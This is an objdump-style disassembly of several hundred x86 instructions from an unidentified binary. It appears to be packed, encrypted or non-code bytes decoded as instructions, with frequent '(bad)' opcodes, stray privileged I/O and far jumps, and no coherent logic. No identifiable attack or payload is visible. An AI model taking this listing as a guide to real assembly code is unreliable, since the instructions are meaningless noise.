  421591:	bound  bp,DWORD PTR [edi]
  421594:	cmp    DWORD PTR [ebx-0x3e],eax
  421597:	or     DWORD PTR [ebp+0x3a],esp
  42159a:	xlat   BYTE PTR ds:[ebx]
  42159b:	mov    dl,0x71
  42159d:	mov    esi,0x89bf906
  4215a2:	sub    ebp,DWORD PTR [ecx]
  4215a4:	sub    al,0x82
  4215a6:	inc    eax
  4215a7:	enter  0xde5a,0xb0
  4215ab:	repz shr BYTE PTR [ebx+ebx*8-0x6f411c6e],0x7f
  4215b4:	(bad)  
  4215b5:	cmp    ebx,edi
  4215b7:	mov    ebp,0x486dc90e
  4215bc:	ds pop edx
  4215be:	jmp    0xdeb8:0x21f2d649
  4215c5:	dec    edx
  4215c6:	fs jb  0x42155c
  4215c9:	clc    
  4215ca:	(bad)  
  4215cb:	jae    0x4215d9
  4215cd:	sbb    BYTE PTR [esi],ah
  4215cf:	jg     0x4215b3
  4215d1:	pop    ebx
  4215d2:	or     BYTE PTR [esi-0x75],dl
  4215d5:	in     al,dx
  4215d6:	imul   eax,eax,0x2b
  4215d9:	mov    edx,DWORD PTR [eax-0x297fe955]
  4215df:	inc    eax
  4215e0:	or     al,0xe
  4215e2:	ror    BYTE PTR [ecx-0x60],1
  4215e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4215e6:	in     al,dx
  4215e7:	lods   eax,DWORD PTR ds:[esi]
  4215e8:	push   ds
  4215e9:	inc    esp
  4215ea:	jbe    0x4215bc
  4215ec:	fwait
  4215ed:	sar    DWORD PTR [eax],cl
  4215ef:	push   ecx
  4215f0:	jl     0x421599
  4215f2:	enter  0x676a,0xe5
  4215f6:	clc    
  4215f7:	popa   
  4215f8:	pop    ecx
  4215f9:	mov    ecx,DWORD PTR [ebx]
  4215fb:	dec    edx
  4215fc:	in     eax,0x1b
  4215fe:	mul    BYTE PTR [ebx]
  421600:	fwait
  421601:	addr16 jl 0x421588
  421604:	push   ds
  421605:	sti    
  421606:	xchg   esp,eax
  421607:	add    ebp,eax
  421609:	loope  0x4215c0
  42160b:	arpl   WORD PTR ds:0x6bc9e59d,ax
  421611:	cli    
  421612:	pop    esi
  421613:	mov    edx,0xb63d599b
  421618:	lods   eax,DWORD PTR ds:[esi]
  421619:	jle    0x421690
  42161b:	repz pop ebp
  42161d:	fisub  WORD PTR [edx-0x2e]
  421620:	mov    ebx,0x577711a
  421625:	repnz push cs
  421627:	es fwait
  421629:	xchg   ebp,eax
  42162a:	imul   esi,DWORD PTR [ebx],0x94e98961
  421630:	clc    
  421631:	frstor [edx+0x3e33d235]
  421637:	out    dx,eax
  421638:	push   ecx
  421639:	pop    ss
  42163a:	nop
  42163b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42163c:	imul   eax,DWORD PTR [eax+0x25bf2be3],0x72e74a6b
  421646:	dec    esi
  421647:	push   ss
  421648:	pop    es
  421649:	stos   DWORD PTR es:[edi],eax
  42164a:	jmp    0xa741b894
  42164f:	out    0xeb,eax
  421651:	cmp    dh,BYTE PTR [eax+0x53]
  421654:	mov    dh,0xdc
  421656:	xor    cl,BYTE PTR [edx+0x17]
  421659:	xchg   esi,eax
  42165a:	xor    BYTE PTR [ebx],ch
  42165c:	popf   
  42165d:	add    BYTE PTR [ebp+0x50efa24f],bl
  421663:	push   ds
  421664:	pop    ds
  421665:	cmp    BYTE PTR [eax-0x59],al
  421668:	pop    ecx
  421669:	cmc    
  42166a:	sbb    BYTE PTR [edx+0x3a],cl
  42166d:	sub    eax,0x8ca8944c
  421672:	test   al,0xcf
  421674:	fwait
  421675:	or     BYTE PTR [ecx+0x7ab410ac],bh
  42167b:	mov    bl,0x28
  42167d:	in     eax,0x6e
  42167f:	(bad)  
  421680:	out    0xaf,al
  421682:	stos   BYTE PTR es:[edi],al
  421683:	cdq    
  421684:	pushf  
  421685:	or     al,0x16
  421687:	scas   eax,DWORD PTR es:[edi]
  421688:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421689:	iret   
  42168a:	fst    QWORD PTR [edx-0x13]
  42168d:	test   DWORD PTR [eax+0x10a39540],edx
  421693:	stc    
  421694:	and    al,0xde
  421696:	cmp    eax,0xa46ac292
  42169b:	mov    ah,0x3c
  42169d:	dec    ebx
  42169e:	nop
  42169f:	lds    ebx,FWORD PTR [edi-0x69ac59e5]
  4216a5:	inc    ecx
  4216a6:	mov    dh,0x67
  4216a8:	add    eax,0x2b8f12b1
  4216ad:	test   DWORD PTR [edx+ecx*8],0x7ef7be32
  4216b4:	push   ebx
  4216b5:	pop    edx
  4216b6:	nop
  4216b7:	fs data16 test al,0xfc
  4216bb:	into   
  4216bc:	stos   BYTE PTR es:[edi],al
  4216bd:	ret    
  4216be:	dec    esp
  4216bf:	dec    edx
  4216c0:	xor    ebx,DWORD PTR [ebp-0x29]
  4216c3:	dec    ebx
  4216c5:	inc    edi
  4216c6:	inc    ebx
  4216c7:	cld    
  4216c8:	pushf  
  4216c9:	outs   dx,BYTE PTR ds:[esi]
  4216ca:	jle    0x421744
  4216cc:	jno    0x421688
  4216ce:	pop    ds
  4216cf:	push   ecx
  4216d0:	xchg   ebx,eax
  4216d1:	and    DWORD PTR [ecx+0x2c63a04a],ecx
  4216d7:	sbb    ecx,DWORD PTR [edx*4+0x3a85cf48]
  4216de:	sahf   
  4216df:	jae    0x4216d7
  4216e1:	bnd js 0x42168e
  4216e4:	dec    eax
  4216e5:	inc    ebx
  4216e6:	in     al,0x3f
  4216e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4216e9:	loop   0x4216c8
  4216eb:	add    al,0x5c
  4216ed:	xchg   ebx,eax
  4216ee:	je     0x4216fa
  4216f0:	retf   
  4216f1:	mov    es,WORD PTR [edx-0x7f]
  4216f4:	mov    ds:0x7ed00cb5,al
  4216f9:	(bad)  
  4216fa:	pop    ds
  4216fb:	cmp    BYTE PTR [edx],bl
  4216fd:	jmp    0x4a48:0xf61ee9a9
  421704:	mov    al,ds:0x28e46e04
  421709:	and    esp,DWORD PTR [ebx]
  42170b:	lea    ecx,[ebx]
  42170d:	jp     0x42169f
  42170f:	xor    al,0x63
  421711:	lahf   
  421712:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421713:	pop    esp
  421714:	(bad)  
  421715:	mov    WORD PTR [edx],ds
  421717:	cdq    
  421718:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421719:	mov    ebp,0xc39be3e8
  42171e:	sub    esi,DWORD PTR [edi-0x4c]
  421721:	mov    eax,0xde831063
  421726:	sbb    eax,0x1121ff24
  42172b:	lea    edx,[ecx]
  42172d:	inc    ebx
  42172e:	mov    esp,0x902ed009
  421733:	rcl    DWORD PTR [edx],cl
  421735:	mov    ebp,DWORD PTR [edx]
  421737:	in     al,dx
  421738:	dec    ecx
  421739:	fidiv  WORD PTR [edi]
  42173b:	jo     0x4216c5
  42173d:	sub    DWORD PTR ds:0x49b54a3,0x2df2d76f
  421747:	popa   
  421748:	into   
  421749:	ficomp WORD PTR [esi-0x23e23b2b]
  42174f:	addr16 jle 0x42179d
  421752:	shr    DWORD PTR [ebx],0xff
  421755:	fld    QWORD PTR [edi+esi*8-0x35e3378]
  42175c:	stc    
  42175d:	push   ds
  42175e:	mov    ds:0x90456a75,al
  421763:	mov    ebp,0xf179a0cb
  421768:	or     dh,bl
  42176a:	or     DWORD PTR [ebp+0x20],eax
  42176d:	jns    0x4217c4
  42176f:	(bad)  
  421770:	int    0x17
  421772:	xchg   ebx,eax
  421773:	inc    edx
  421774:	addr16 out 0x63,eax
  421777:	(bad)  
  421778:	fistp  DWORD PTR [ebp-0x1e]
  42177b:	jl     0x421784
  42177d:	pop    ebx
  42177e:	mov    ebp,0x85fc6d49
  421783:	mov    al,0x66
  421785:	jge    0x421752
  421787:	push   ebp
  421788:	fwait
  421789:	mov    ebp,DWORD PTR ds:0x4fd4f286
  42178f:	xchg   ebx,eax
  421790:	popa   
  421791:	fisub  WORD PTR [edi+0x38726f5c]
  421797:	jmp    0x421769
  421799:	or     BYTE PTR [eax+0x337c3886],dl
  42179f:	sbb    ah,BYTE PTR [eax-0x7c]
  4217a2:	push   eax
  4217a3:	sub    al,0x69
  4217a5:	sub    al,0x25
  4217a7:	xor    bl,bl
  4217a9:	jmp    0x421822
  4217ab:	push   cs
  4217ac:	inc    edi
  4217ad:	(bad)  
  4217ae:	ffree  st(5)
  4217b0:	cmp    BYTE PTR [ecx+0x68],bl
  4217b3:	out    dx,eax
  4217b4:	adc    ebx,esi
  4217b6:	add    eax,0xb29679f7
  4217bb:	mov    edx,0xf1938da1
  4217c0:	inc    esi
  4217c1:	popa   
  4217c2:	pop    ebp
  4217c3:	jmp    0x4217d4
  4217c5:	jle    0x421794
  4217c7:	(bad)  
  4217c8:	stc    
  4217c9:	ffree  st(4)
  4217cb:	sahf   
  4217cc:	adc    esp,DWORD PTR [edx+0x73]
  4217cf:	outs   dx,BYTE PTR ds:[esi]
  4217d0:	test   BYTE PTR [ecx-0x70],0xca
  4217d4:	cmp    cl,bl
  4217d6:	and    edx,DWORD PTR [eax]
  4217d8:	xor    eax,0x284a0fcd
  4217dd:	adc    eax,0xd218ea5c
  4217e2:	fild   WORD PTR [edx]
  4217e4:	fwait
  4217e5:	mov    ds:0x4ca5a8d6,al
  4217ea:	jp     0x4217ab
  4217ec:	dec    ecx
  4217ed:	ficomp WORD PTR [edx-0x23effc4c]
  4217f3:	mov    bh,0x8d
  4217f5:	xchg   DWORD PTR [eax+0x48300896],edx
  4217fb:	add    BYTE PTR ss:0xc81649a3,cl
  421802:	jne    0x421797
  421804:	xor    ah,BYTE PTR [edi+0x7b]
  421807:	inc    ebx
  421808:	sahf   
  421809:	rcl    BYTE PTR [ecx],cl
  42180b:	(bad)  
  42180c:	jns    0x421812
  42180e:	push   es
  42180f:	dec    edx
  421810:	aas    
  421811:	mov    ds:0x6fcba0f3,al
  421816:	sti    
  421817:	ficomp WORD PTR [ecx+eiz*8+0x15691c9e]
  42181e:	adc    dl,BYTE PTR [esi]
  421820:	sti    
  421821:	pusha  
  421822:	iret   
  421823:	push   edi
  421824:	xor    al,0x2f
  421826:	push   cs
  421827:	adc    DWORD PTR [ebx+0x260d03ca],edi
  42182d:	js     0x421817
  42182f:	xor    BYTE PTR [ecx+0x4f2b91dd],ch
  421835:	dec    eax
  421836:	out    0x28,eax
  421838:	rcr    ebp,1
  42183a:	enter  0x3f29,0x45
  42183e:	pop    ss
  42183f:	arpl   WORD PTR [eax-0x5efe6d11],ax
  421845:	imul   esi,DWORD PTR [ecx-0x66616b6d],0xffffffd9
  42184c:	(bad)  
  42184d:	in     al,0x30
  42184f:	jo     0x421898
  421851:	mov    al,ds:0xe1bb49e
  421856:	and    al,0x9e
  421858:	jp     0x42186b
  42185a:	sub    BYTE PTR [eax-0x3e30575e],al
  421860:	jmp    FWORD PTR [esi]
  421862:	sbb    dl,0x14
  421865:	clc    
  421866:	xor    eax,0xf234104a
  42186b:	jge    0x42182d
  42186d:	mov    es,WORD PTR [edx]
  42186f:	aad    0x9b
  421871:	xor    al,0xbf
  421873:	ja     0x4218e4
  421875:	push   ecx
  421876:	cmp    al,0x13
  421878:	sar    DWORD PTR [esi+0x1d038f68],1
  42187e:	cs out 0xfb,al
  421881:	xchg   ebp,eax
  421882:	cld    
  421883:	and    al,0xf1
  421885:	pop    edx
  421886:	and    BYTE PTR [edi-0x5e],dl
  421889:	dec    edi
  42188a:	cmc    
  42188b:	mov    esp,0xa5b00106
  421890:	and    al,BYTE PTR [ecx+0x6e]
  421893:	dec    edx
  421894:	das    
  421895:	xor    esi,esi
  421897:	mov    ebx,esp
  421899:	pop    esp
  42189a:	inc    edx
  42189b:	daa    
  42189c:	mov    bh,0xce
  42189e:	add    BYTE PTR [ecx+0x452be25b],0x44
  4218a5:	xor    bl,BYTE PTR [edx+0x1f514649]
  4218ab:	test   ebp,edi
  4218ad:	xchg   ecx,eax
  4218ae:	adc    DWORD PTR [edi],ebp
  4218b0:	fidivr DWORD PTR [eax-0x45]
  4218b4:	sbb    DWORD PTR [ecx+0x59],eax
  4218b7:	outs   dx,BYTE PTR ds:[esi]
  4218b8:	sub    al,0x3a
  4218ba:	xchg   esi,eax
  4218bb:	sub    BYTE PTR [ecx-0x64e8eb77],0xf1
  4218c2:	sub    al,0xdf
  4218c4:	popa   
  4218c5:	imul   esp,DWORD PTR [ebx-0x6e362162],0x5b28242e
  4218cf:	(bad)  
  4218d0:	addr16 aad 0xe2
  4218d3:	dec    esi
  4218d4:	scas   al,BYTE PTR es:[edi]
  4218d5:	call   0x5eb839cc
  4218da:	(bad)  [ecx+0x11]
  4218dd:	jne    0x421863
  4218df:	jmp    0x9acc8a8e
  4218e4:	(bad)
  4218e7:	jg     0x421879
  4218e9:	sar    BYTE PTR [esi+eiz*2],cl
  4218ec:	and    ch,BYTE PTR [ebx+eax*1-0x3b]
  4218f0:	fwait
  4218f1:	gs push 0xc85a9953
  4218f7:	adc    BYTE PTR [ecx],0xf9
  4218fa:	(bad)  
  4218fb:	mov    ds:0x75c8bd7,al
  421900:	jge    0x421883
  421902:	jecxz  0x42194d
  421904:	adc    BYTE PTR [eax-0x76],dh
  421907:	jg     0x4218cc
  421909:	cmp    al,0x30
  42190b:	push   es
  42190c:	fxch   st(1)
  42190f:	cdq    
  421910:	adc    al,BYTE PTR [ecx]
  421912:	lock mov eax,ds:0x49f157a4
  421918:	dec    edx
  421919:	mov    esi,0x89ce25f9
  42191e:	cmp    dl,BYTE PTR [edi]
  421920:	fwait
  421921:	xor    BYTE PTR ds:0xa7ea221a,cl
  421927:	inc    esp
  421928:	leave  
  421929:	fld    QWORD PTR [ecx+0x57]
  42192c:	ins    BYTE PTR es:[edi],dx
  42192d:	sub    ecx,DWORD PTR [ebp-0x42]
  421930:	ret    0x909c
  421933:	test   al,bh
  421935:	popf   
  421936:	into   
  421937:	cli    
  421938:	sti    
  421939:	out    dx,eax
  42193a:	ror    DWORD PTR [ecx+0x45],0x70
  42193e:	lods   al,BYTE PTR ds:[esi]
  42193f:	lds    edx,FWORD PTR [edi-0x36]
  421942:	jae    0x421926
  421944:	mov    dl,0x27
  421946:	cmp    esi,esi
  421948:	fwait
  421949:	push   0xe536bc4
  42194e:	mov    dh,0xb9
  421950:	push   edx
  421951:	lock adc ebp,ebp
  421954:	repnz (bad) [edx-0x21]
  421958:	mov    eax,0x167b2a2a
  42195d:	out    dx,eax
  42195e:	xchg   esi,eax
  42195f:	pop    esp
  421960:	imul   esp,DWORD PTR ss:[eax-0x7ada1408],0xffffffbc
  421968:	pmaxub mm1,QWORD PTR [ecx-0x5dd77ab8]
  42196f:	fs jle 0x421939
  421972:	scas   al,BYTE PTR es:[edi]
  421973:	shr    bh,cl
  421975:	mov    ecx,0xb5d7eed0
  42197a:	inc    edx
  42197b:	add    dl,ch
  42197d:	in     al,dx
  42197e:	test   DWORD PTR [esi],0x2dbf6345
  421984:	jl     0x421945
  421986:	inc    eax
  421987:	lods   al,BYTE PTR ds:[esi]
  421988:	test   ecx,edx
  42198a:	scas   al,BYTE PTR es:[edi]
  42198b:	xor    DWORD PTR [ebx],esi
  42198d:	xchg   ebx,eax
  42198e:	aad    0x16
  421990:	add    esp,esi
  421992:	dec    edi
  421993:	mov    dl,0x67
  421995:	adc    bl,bh
  421997:	push   eax
  421998:	jg     0x4219d5
  42199a:	and    DWORD PTR [ebp+0x5e1efc7b],ebp
  4219a0:	sti    
  4219a1:	cmp    BYTE PTR [ebp-0x34cb8a30],al
  4219a7:	lds    eax,FWORD PTR [esi]
  4219a9:	fiadd  WORD PTR [ebx+esi*1-0x33]
  4219ad:	retf   
  4219ae:	push   edx
  4219af:	out    dx,al
  4219b0:	out    dx,eax
  4219b1:	hlt    
  4219b2:	jl     0x421950
  4219b4:	cmp    ebp,ebp
  4219b6:	xor    DWORD PTR [esi],ecx
  4219b8:	fwait
  4219b9:	mov    ds:0xd4a6137a,al
  4219be:	nop
  4219bf:	mov    ebx,DWORD PTR [edi]
  4219c1:	mov    al,0x1b
  4219c3:	add    ah,ch
  4219c5:	cs aas 
  4219c7:	pop    ecx
  4219c8:	cdq    
  4219c9:	add    al,BYTE PTR [edx-0x243c8418]
  4219cf:	mov    ebp,0x5690a53c
  4219d4:	imul   esi,DWORD PTR [ebx],0x24ab8ac1
  4219da:	dec    eax
  4219db:	pop    eax
  4219dc:	push   cs
  4219dd:	int    0xb5
  4219df:	add    bl,BYTE PTR [eax-0x62]
  4219e2:	push   edx
  4219e3:	jae    0x421a3f
  4219e5:	mov    gs,WORD PTR [ebp+ebx*4-0xc09a34e]
  4219ec:	mov    ds:0x2b8f1b5a,al
  4219f1:	xlat   BYTE PTR ds:[ebx]
  4219f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4219f3:	ja     0x42197c
  4219f5:	jecxz  0x42199a
  4219f7:	adc    cl,BYTE PTR [ebp-0x56f61448]
  4219fd:	xor    al,0x29
  4219ff:	mov    cl,0x8b
  421a01:	mov    eax,ds:0x8852ed93
  421a06:	jmp    0x2cc033a6
  421a0b:	sub    eax,0xbf865782
  421a10:	push   eax
  421a11:	fidiv  WORD PTR [edi-0x14]
  421a14:	inc    eax
  421a15:	pop    es
  421a16:	fiadd  DWORD PTR [eax+ebx*2]
  421a19:	not    DWORD PTR [esi+0x3c926012]
  421a1f:	cmp    BYTE PTR [edi+eax*2+0x57],ch
  421a23:	loope  0x4219b8
  421a25:	(bad)  
  421a26:	xchg   esi,eax
  421a27:	dec    ecx
  421a28:	enter  0x7dc,0xec
  421a2c:	mov    ds:0x9c5f2ea1,eax
  421a31:	lock rcl BYTE PTR [ebp-0x4cb27e4a],1
  421a38:	cmp    BYTE PTR [edx],0x70
  421a3b:	popf   
  421a3c:	in     eax,0xf9
  421a3e:	cwde   
  421a3f:	xchg   esp,eax
  421a40:	mov    eax,0x569bb164
  421a45:	jge    0x421a17
  421a47:	jnp    0x421a9e
  421a49:	mov    esp,0xf39b7367
  421a4e:	add    al,0xf5
  421a50:	fdivr  QWORD PTR [eax+0x1a]
  421a53:	icebp  
  421a54:	(bad)  
  421a55:	fisttp QWORD PTR [eax]
  421a57:	or     bl,BYTE PTR [ecx+0x17740160]
  421a5d:	sbb    eax,0x7487ec90
  421a62:	or     BYTE PTR [ebx+0x67],bh
  421a65:	mov    dl,0x69
  421a67:	dec    edx
  421a68:	xchg   dl,dh
  421a6a:	add    al,0x4
  421a6c:	cmp    BYTE PTR [ebp-0x39641429],0x35
  421a73:	dec    ebp
  421a74:	rol    cl,cl
  421a76:	mov    cl,0x58
  421a78:	adc    al,0xec
  421a7a:	sar    BYTE PTR [ebx+ebp*8+0x5475f049],1
  421a81:	les    edi,FWORD PTR [edx+0x2a]
  421a84:	fwait
  421a85:	(bad)  
  421a86:	out    0xcd,al
  421a88:	cwde   
  421a89:	int3   
  421a8a:	faddp  st(4),st
  421a8c:	in     al,dx
  421a8d:	cmp    eax,0x875f01b5
  421a92:	ds mov esi,0x1c38a09b
  421a98:	push   ecx
  421a99:	push   ds
  421a9a:	iret   
  421a9b:	xchg   esp,eax
  421a9c:	leave  
  421a9d:	ret    
  421a9e:	mul    DWORD PTR [ebp-0x1]
  421aa1:	cmp    ecx,DWORD PTR [edi+eiz*8-0x38b7da9e]
  421aa8:	mov    al,ds:0x7b4b00bf
  421aad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421aae:	pop    es
  421aaf:	jns    0x421a4c
  421ab1:	outs   dx,BYTE PTR ds:[esi]
  421ab2:	test   eax,0x10786ade
  421ab7:	mov    ebx,0x49ee583c
  421abc:	(bad)  
  421abd:	push   ecx
  421abe:	cli    
  421abf:	add    edx,DWORD PTR [esi-0x13]
  421ac2:	ins    DWORD PTR es:[edi],dx
  421ac3:	cmp    eax,0x7391e39b
  421ac8:	pop    esp
  421ac9:	imul   ebp,DWORD PTR [ebp+0x70ddb49a],0xeb2d5f88
  421ad3:	pop    eax
  421ad4:	push   esi
  421ad5:	sbb    ah,cl
  421ad7:	scas   al,BYTE PTR es:[edi]
  421ad8:	data16 cli 
  421ada:	outs   dx,DWORD PTR ds:[esi]
  421adb:	push   0x4625b31b
  421ae0:	in     eax,dx
  421ae1:	adc    ecx,DWORD PTR es:[edx-0x3b]
  421ae5:	add    dl,al
  421ae7:	inc    edi
  421ae8:	icebp  
  421ae9:	dec    ebx
  421aea:	xchg   esi,eax
  421aeb:	xchg   esi,eax
  421aec:	xchg   ecx,eax
  421aed:	mov    DWORD PTR [eax-0x78b163a7],edx
  421af3:	xchg   BYTE PTR [edi-0x4aeb188],dh
  421af9:	into   
  421afa:	cld    
  421afb:	cmp    BYTE PTR ds:0x110b1a7f,0xba
  421b02:	sbb    esi,DWORD PTR [esi+ebp*4+0x40]
  421b06:	sar    BYTE PTR [eax],cl
  421b08:	mov    ecx,0x74640fdf
  421b0d:	sub    al,0x3
  421b0f:	dec    eax
  421b10:	xor    bl,BYTE PTR [ecx]
  421b12:	js     0x421b04
  421b14:	fwait
  421b15:	sti    
  421b16:	clc    
  421b17:	jnp    0x421b3b
  421b19:	dec    eax
  421b1a:	and    eax,0xbf269bb8
  421b1f:	sbb    eax,edx
  421b21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421b22:	mov    esp,0xad4fb4f8
  421b27:	rcl    DWORD PTR [eax],0xde
  421b2a:	pop    ebp
  421b2b:	sub    BYTE PTR [eax-0x7d],0xe9
  421b2f:	cmp    edx,esp
  421b31:	cmp    al,0x90
  421b33:	ficom  DWORD PTR [edi+0x8]
  421b36:	push   eax
  421b37:	pop    ebx
  421b38:	int    0xea
  421b3a:	cmp    cl,BYTE PTR [edx+0xa]
  421b3d:	or     dl,BYTE PTR [esi]
  421b3f:	lods   al,BYTE PTR ds:[esi]
  421b40:	fidivr WORD PTR [ecx+esi*4-0x595b476a]
  421b47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421b48:	sbb    eax,DWORD PTR [edx]
  421b4a:	mov    dl,0x5
  421b4c:	adc    cl,BYTE PTR [eax-0x45]
  421b4f:	(bad)  
  421b50:	scas   eax,DWORD PTR es:[edi]
  421b51:	add    ecx,DWORD PTR [eax]
  421b53:	loop   0x421b88
  421b55:	fisub  WORD PTR [esi-0x1a]
  421b58:	inc    DWORD PTR [edx+0xdb73a32]
  421b5e:	scas   eax,DWORD PTR es:[edi]
  421b5f:	sti    
  421b60:	fist   DWORD PTR [edi]
  421b62:	test   eax,0x2339c1c3
  421b67:	dec    edx
  421b68:	popf   
  421b69:	and    ecx,edx
  421b6b:	int    0xf1
  421b6d:	xchg   DWORD PTR [ecx-0x7f744677],ecx
  421b73:	popa   
  421b74:	pop    ebx
  421b75:	push   ebx
  421b76:	repnz shl DWORD PTR [eax-0x1fb5d460],cl
  421b7d:	mov    cl,0xf5
  421b7f:	das    
  421b80:	xchg   ecx,eax
  421b81:	inc    esi
  421b82:	and    ecx,ecx
  421b84:	mov    eax,0x9bbf3fea
  421b89:	paddsb mm4,mm6
  421b8c:	mov    cl,0xca
  421b8e:	sahf   
  421b8f:	dec    ecx
  421b90:	cmp    BYTE PTR [edi-0x3f23fe8],0x22
  421b97:	or     al,0x9b
  421b99:	jne    0x421b88
  421b9b:	sub    edx,DWORD PTR [ebx-0x7]
  421b9e:	or     al,0xe4
  421ba0:	out    0xdd,al
  421ba2:	push   ss
  421ba3:	jle    0x421bde
  421ba5:	mul    BYTE PTR [eax+0x7d]
  421ba8:	push   0xdcef8fe1
  421bad:	push   0x7f20323c
  421bb2:	jl     0x421c01
  421bb4:	push   esi
  421bb5:	fild   QWORD PTR [bp+di]
  421bb8:	ficomp DWORD PTR [edi]
  421bba:	nop
  421bbb:	aad    0x19
  421bbd:	mov    eax,ds:0xb2a55b2f
  421bc2:	xor    DWORD PTR [edx+0x6],ecx
  421bc5:	std    
  421bc6:	xchg   ebx,eax
  421bc7:	adc    al,0x92
  421bc9:	scas   eax,DWORD PTR es:[edi]
  421bca:	es cwde 
  421bcc:	fwait
  421bcd:	push   edi
  421bce:	out    dx,al
  421bcf:	fsub   QWORD PTR [eax-0x531e6ed3]
  421bd5:	in     al,0x68
  421bd7:	mov    BYTE PTR [ecx-0x67],0x59
  421bdb:	retf   0x9bfb
  421bde:	pop    ebx
  421bdf:	inc    ebx
  421be0:	test   eax,0x2b76d579
  421be5:	fimul  WORD PTR [eax]
  421be7:	push   0xffffffb9
  421be9:	imul   eax,ecx,0x9bf27549
  421bef:	jns    0x421b75
  421bf1:	pop    ss
  421bf2:	mul    BYTE PTR ds:0x2f90c08d
  421bf8:	dec    edi
  421bf9:	adc    al,0xe7
  421bfb:	and    ebx,0x564a3c0a
  421c01:	or     DWORD PTR [edx],edi
  421c03:	aaa    
  421c04:	fs jno 0x421bba
  421c07:	data16 fwait
  421c09:	xor    esp,DWORD PTR [edi+0x52b512e9]
  421c0f:	adc    al,0x3
  421c11:	ficom  WORD PTR [ebp-0x494e2d76]
  421c17:	jne    0x421bbf
  421c19:	fisttp WORD PTR [edi+0x12c49fcf]
  421c1f:	loopne 0x421c7a
  421c21:	fadd   DWORD PTR [ecx]
  421c23:	dec    edx
  421c24:	(bad)  
  421c25:	sub    cl,BYTE PTR [ebp+0xe212b05]
  421c2b:	aad    0x9b
  421c2d:	outs   dx,DWORD PTR ds:[esi]
  421c2e:	jg     0x421be5
  421c30:	xlat   BYTE PTR ds:[ebx]
  421c31:	sti    
  421c32:	ds push ds
  421c34:	xchg   ebp,eax
  421c35:	fidiv  WORD PTR [ebx]
  421c37:	add    BYTE PTR [edi-0x526a17b4],bl
  421c3d:	fist   DWORD PTR [eax+0x1ff6281a]
  421c43:	aad    0x7c
  421c45:	jne    0x421c9a
  421c47:	pop    ecx
  421c48:	stos   BYTE PTR es:[edi],al
  421c49:	out    0x76,al
  421c4b:	cmc    
  421c4c:	sti    
  421c4d:	dec    esp
  421c4e:	fdivp  st(0),st
  421c50:	and    al,0x8e
  421c52:	nop
  421c53:	xchg   ebx,eax
  421c54:	or     al,0x5e
  421c56:	(bad)  
  421c57:	adc    esp,DWORD PTR [esi-0x56b5d90e]
  421c5d:	ret    0x9047
  421c60:	dec    eax
  421c61:	xor    cl,BYTE PTR [edx]
  421c63:	stc    
  421c64:	shr    DWORD PTR [esi-0x7252f9f4],0x90
  421c6b:	xor    edx,edi
  421c6d:	mov    ah,0x6
  421c6f:	fstp   QWORD PTR [ecx-0x22]
  421c72:	stos   DWORD PTR es:[edi],eax
  421c73:	and    cl,ah
  421c75:	mov    ds:0x3eed3c5c,al
  421c7a:	nop
  421c7b:	out    0xeb,al
  421c7d:	(bad)
  421c81:	stc    
  421c82:	sbb    eax,DWORD PTR [ebp+0x42904220]
  421c88:	int    0x9d
  421c8a:	in     al,dx
  421c8b:	dec    ebp
  421c8c:	add    al,0x16
  421c8e:	nop
  421c8f:	or     BYTE PTR [eax-0x35bfd80b],ah
  421c95:	rcl    BYTE PTR [ebx+0x66],cl
  421c98:	dec    esp
  421c99:	paddusw mm1,QWORD PTR [ecx+0x7d]
  421c9d:	mov    ch,0x30
  421c9f:	or     al,0x39
  421ca1:	sbb    DWORD PTR [ecx-0x416b3830],0x4a
  421ca8:	or     BYTE PTR [eax+0x63],dl
  421cab:	pop    esi
  421cac:	mov    ebx,0xee768cec
  421cb1:	add    ebx,DWORD PTR [ecx]
  421cb3:	dec    edx
  421cb4:	add    al,0xd8
  421cb6:	adc    DWORD PTR [edi],0x19
  421cb9:	gs nop
  421cbb:	sub    bh,ah
  421cbd:	retf   
  421cbe:	inc    esi
  421cbf:	jmp    0x421c50
  421cc1:	push   edi
  421cc2:	jmp    0xd22ed010
  421cc7:	xchg   ebp,eax
  421cc8:	je     0x421c6f
  421cca:	js     0x421d03
  421ccc:	fwait
  421ccd:	lods   al,BYTE PTR ds:[esi]
  421cce:	mov    BYTE PTR [ecx],0xe9
  421cd1:	push   ecx
  421cd2:	and    eax,0x9fde7670
  421cd7:	xor    al,0x4a
  421cda:	(bad)  
  421cdc:	cli    
  421cdd:	mov    al,ds:0xb1110790
  421ce2:	adc    BYTE PTR [edi-0x66],bl
  421ce5:	push   esi
  421ce6:	xchg   DWORD PTR [eax-0xd],ebx
  421ce9:	and    BYTE PTR [eax-0xb],cl
  421cec:	mov    esp,0xe6a7e1df
  421cf1:	mov    ch,0x5b
  421cf3:	or     bl,BYTE PTR [ebx-0x798feff0]
  421cf9:	or     eax,DWORD PTR [eax-0x402418c7]
  421cff:	dec    ecx
  421d00:	test   al,0xeb
  421d02:	jmp    0x13f2e380
  421d07:	mov    ebx,DWORD PTR [ebx+0xe7789fd]
  421d0d:	sub    BYTE PTR [edi],0x31
  421d10:	and    ebx,esi
  421d12:	sub    ebx,edx
  421d14:	icebp  
  421d15:	(bad)  
  421d16:	adc    bh,BYTE PTR [ebp+0x29]
  421d19:	test   BYTE PTR [eax+0xc45cf95],dl
  421d1f:	mov    edx,0x4e4f3ef9
  421d24:	dec    ecx
  421d25:	jecxz  0x421d3c
  421d27:	mov    bh,0x67
  421d29:	pop    esi
  421d2a:	sub    eax,0x77ebf3a4
  421d2f:	mov    esp,0x3491759b
  421d34:	pop    es
  421d35:	outs   dx,BYTE PTR ds:[esi]
  421d36:	mov    esi,0x29ddbf14
  421d3b:	jbe    0x421cf0
  421d3d:	(bad)
  421d40:	int3   
  421d41:	adc    cl,BYTE PTR [esi-0x76ad2998]
  421d47:	aas    
  421d48:	fwait
  421d49:	pop    ecx
  421d4a:	mov    esi,0xde93db2
  421d4f:	cmp    BYTE PTR [esi],dh
  421d51:	ficom  WORD PTR [edi+0x1f]
  421d54:	daa    
